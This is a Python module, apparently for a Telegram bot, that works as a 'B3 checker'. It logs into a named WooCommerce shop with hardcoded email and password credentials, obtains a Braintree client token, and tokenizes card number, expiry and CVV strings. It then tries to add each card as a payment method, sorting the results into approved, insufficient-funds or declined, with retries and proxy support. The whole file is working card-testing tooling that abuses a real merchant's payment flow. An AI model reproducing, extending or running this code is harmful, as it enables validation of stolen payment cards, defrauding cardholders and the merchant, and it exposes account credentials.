# ============================================================
#  B3 Checker — Braintree Auth Gate (livresq.com)
#  /b3 command in Telegram bot
# ============================================================

import requests
import re
import base64
import json
import uuid
import time
import os
import random

DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
CONFIG_FILE = os.path.join(DATA_DIR, "b3_config.json")

_DEFAULT_CFG = {
    "site_url": "https://livresq.com",
    "email": "cilika2490@fpxnet.com",
    "password": "Jagrit1234",
    "lang_prefix": "/en",
}


def _load_cfg():
    os.makedirs(DATA_DIR, exist_ok=True)
    if not os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'w') as f:
            json.dump(_DEFAULT_CFG, f, indent=2)
        return dict(_DEFAULT_CFG)
    try:
        with open(CONFIG_FILE, 'r') as f:
            cfg = json.load(f)
        for k, v in _DEFAULT_CFG.items():
            cfg.setdefault(k, v)
        return cfg
    except Exception:
        return dict(_DEFAULT_CFG)


def _save_cfg(cfg):
    os.makedirs(DATA_DIR, exist_ok=True)
    with open(CONFIG_FILE, 'w') as f:
        json.dump(cfg, f, indent=2)


def update_config(key, value):
    cfg = _load_cfg()
    cfg[key] = value
    _save_cfg(cfg)


def get_config():
    return _load_cfg()


def _h1():
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'cache-control': 'max-age=0',
        'upgrade-insecure-requests': '1',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'accept-language': 'en-IN,en;q=0.9',
        'priority': 'u=0, i',
    }


def _h_login(site):
    h = _h1()
    h['referer'] = f'{site}/en/my-account/'
    return h


def _h_post(site):
    h = _h1()
    h['origin'] = site
    h['referer'] = f'{site}/en/my-account/'
    return h


def _h_pay(site):
    h = _h1()
    h['referer'] = f'{site}/en/my-account/payment-methods/'
    return h


def _h_add(site):
    h = _h1()
    h['origin'] = site
    h['cache-control'] = 'max-age=0'
    h['referer'] = f'{site}/en/my-account/add-payment-method/'
    return h


def _h_ajax(site):
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'origin': site,
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': f'{site}/en/my-account/add-payment-method/',
        'accept-language': 'en-IN,en;q=0.9',
        'priority': 'u=1, i',
    }


def _h_bt(auth_fp):
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36',
        'Content-Type': 'application/json',
        'Authorization': f'Bearer {auth_fp}',
        'Braintree-Version': '2018-05-10',
        'Origin': 'https://assets.braintreegateway.com',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://assets.braintreegateway.com/',
        'Accept-Language': 'en-IN,en;q=0.9',
    }


def _login(session, cfg):
    site = cfg["site_url"]
    resp = session.get(f'{site}/en/my-account/', headers=_h_login(site), timeout=30)

    nonce_m = re.search(r'id="woocommerce-login-nonce"[^>]*value="([^"]+)"', resp.text)
    if not nonce_m:
        return False, "Login nonce not found"

    data = {
        'username': cfg["email"],
        'password': cfg["password"],
        'woocommerce-login-nonce': nonce_m.group(1),
        '_wp_http_referer': '/en/contul-meu/',
        'login': 'Log in',
        'trp-form-language': 'en'
    }

    resp = session.post(f'{site}/en/my-account/', headers=_h_post(site), data=data, timeout=30)

    if 'woocommerce-error' in resp.text:
        err_m = re.search(r'<ul class="woocommerce-error"[^>]*>.*?<li>(.*?)</li>', resp.text, re.DOTALL)
        err = re.sub(r'\s+', ' ', err_m.group(1).strip()) if err_m else "Login failed"
        return False, err

    if 'logout' in resp.text.lower() or 'dashboard' in resp.text.lower():
        return True, "OK"

    return False, "Login failed"


def _get_nonces(session, cfg):
    site = cfg["site_url"]
    resp = session.get(f'{site}/en/my-account/add-payment-method/', headers=_h_pay(site), timeout=30)

    add_m = re.search(r'name="woocommerce-add-payment-method-nonce"[^>]*value="([^"]+)"', resp.text)
    if not add_m:
        return None, None

    client_m = re.search(r'client_token_nonce":"([^"]+)"', resp.text)
    if not client_m:
        client_m = re.search(r'client_token_nonce\\u0022:\\u0022([^"]+)\\u0022', resp.text)

    return add_m.group(1), client_m.group(1) if client_m else None


def _get_client_token(session, cfg, client_nonce):
    site = cfg["site_url"]
    resp = session.post(
        f'{site}/wp-admin/admin-ajax.php',
        headers=_h_ajax(site),
        data={'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_nonce},
        timeout=30
    )

    if resp.status_code != 200:
        return None

    try:
        token_resp = resp.json()
        if 'data' not in token_resp:
            return None
        decoded = base64.b64decode(token_resp['data']).decode('utf-8')
        token_json = json.loads(decoded)
        return token_json.get('authorizationFingerprint')
    except Exception:
        return None


def _tokenize(auth_fp, cc, mes, ano, cvv, proxy_dict=None):
    session_id = str(uuid.uuid4())
    gql = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': session_id,
        },
        'query': '''mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
            tokenizeCreditCard(input: $input) {
                token
                creditCard { bin brandCode last4 expirationMonth expirationYear }
            }
        }''',
        'variables': {
            'input': {
                'creditCard': {
                    'number': cc, 'expirationMonth': mes,
                    'expirationYear': ano, 'cvv': cvv,
                },
                'options': {'validate': False},
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    r = requests.post(
        'https://payments.braintree-api.com/graphql',
        headers=_h_bt(auth_fp), json=gql, timeout=30,
        proxies=proxy_dict
    )

    if r.status_code != 200:
        return None

    result = r.json()
    if 'errors' in result:
        return None

    return result.get('data', {}).get('tokenizeCreditCard', {}).get('token')


def _add_payment(session, cfg, payment_token, add_nonce):
    site = cfg["site_url"]

    for retry in range(4):
        data = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': 'visa',
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '',
            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
            'wc_braintree_credit_card_payment_nonce': payment_token,
            'wc_braintree_device_data': '',
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': add_nonce,
            '_wp_http_referer': '/en/contul-meu/add-payment-method/',
            'woocommerce_add_payment_method': '1',
            'trp-form-language': 'en'
        }

        resp = session.post(f'{site}/en/my-account/add-payment-method/', headers=_h_add(site), data=data, timeout=30)

        if 'wait for 20 seconds' in resp.text:
            time.sleep(15)
            continue

        err_m = re.search(r'<ul class="woocommerce-error"[^>]*>.*?<li>(.*?)</li>', resp.text, re.DOTALL)

        if err_m:
            err = re.sub(r'\s+', ' ', re.sub(r'&nbsp;', ' ', err_m.group(1).strip()))

            if 'risk_threshold' in err:
                return False, f"Risk Rejected: {err}"
            if 'insufficient' in err.lower():
                return True, f"Insufficient Funds: {err}"
            if 'CVV' in err or 'cvv' in err:
                return False, f"CVV Declined: {err}"

            code_m = re.search(r'Status code (\d+):', err)
            if code_m:
                return False, f"Declined ({code_m.group(1)}): {err}"
            return False, f"Declined: {err}"

        if 'Nice!' in resp.text or 'AVS' in resp.text or 'avs' in resp.text.lower():
            avs_m = re.search(r'AVS[^.]*\.', resp.text, re.IGNORECASE)
            avs = avs_m.group(0) if avs_m else "AVS OK"
            return True, f"Approved with {avs}"

        if 'payment method was added' in resp.text.lower() or 'successfully added' in resp.text.lower():
            return True, "Payment method added"

        success_m = re.search(r'<div class="woocommerce-message"[^>]*>(.*?)</div>', resp.text, re.DOTALL)
        if success_m:
            txt = re.sub(r'\s+', ' ', re.sub(r'<[^>]+>', '', success_m.group(1).strip()))
            return True, txt

        if retry < 3:
            time.sleep(15)
        else:
            return False, "Unknown response"

    return False, "Max retries"


def check_card(cc_line, proxy_dict=None):
    start = time.time()
    cfg = _load_cfg()

    try:
        parts = cc_line.strip().split('|')
        if len(parts) != 4:
            return "Declined | Invalid format"

        cc, mes, ano, cvv = parts

        session = requests.Session()
        if proxy_dict:
            session.proxies.update(proxy_dict)

        ok, detail = _login(session, cfg)
        if not ok:
            return f"Error | Login failed: {detail}"

        add_nonce, client_nonce = _get_nonces(session, cfg)
        if not add_nonce or not client_nonce:
            return "Error | Could not get nonces"

        auth_fp = _get_client_token(session, cfg, client_nonce)
        if not auth_fp:
            return "Error | Could not get client token"

        token = _tokenize(auth_fp, cc, mes, ano, cvv, proxy_dict)
        if not token:
            return "Declined | Tokenization failed"

        success, msg = _add_payment(session, cfg, token, add_nonce)
        elapsed = round(time.time() - start, 2)

        if success:
            return f"Approved | {msg} | {elapsed}s"
        return f"Declined | {msg} | {elapsed}s"

    except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
        return "ConnError | Connection failed"
    except requests.exceptions.Timeout:
        return "ConnError | Timeout"
    except Exception as e:
        return f"Error | {str(e)[:60]}"


def probe_site():
    cfg = _load_cfg()
    try:
        r = requests.get(f'{cfg["site_url"]}/en/my-account/', timeout=15)
        if r.status_code == 200 and 'woocommerce' in r.text.lower():
            return True, "WooCommerce + Braintree active"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, str(e)[:60]
